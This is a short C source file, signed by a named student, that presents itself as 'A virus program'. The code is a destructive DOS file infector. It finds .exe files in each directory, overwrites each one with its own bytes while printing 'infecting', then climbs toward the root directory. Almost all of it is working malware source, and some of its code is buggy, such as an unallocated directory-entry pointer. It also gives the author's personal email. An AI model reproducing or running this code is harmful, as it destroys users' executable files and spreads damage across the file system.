/*A virus program
coded by Tapan Kumar Mishra
         BE Electrical Engg.
         IGIT Sarang,Orissa
         7th sem
      email id:titu_igit@rediffmail.com
*/
#include<stdio.h>
#include<dir.h>
#include<dos.h>
void main(int argc,char *argv[])
{
int bytes,i,done;
FILE *virus,*host;
struct ffblk *f;
char buffer[512];
do
{
	done=findfirst("*.exe",f,0);
	while(!done)
	{
		virus=fopen(argv[0],"rb");//open the virus in read mode
		host=fopen(f->ff_name,"rb+");//open the host file in r/w mode

		 for(;fread(buffer,512,1,virus)==1;)

			fwrite(buffer,512,1,host);
		fclose(host);
		fseek(virus,0,0);//points to begining of virus
		printf("infecting %s 
",f->ff_name);
		done=findnext(f);
		}
}
while(!chdir(".."));
printf("For any query contact 
    Tapan Kumar
Mishra,id:titu_igit@rediffmail.com");

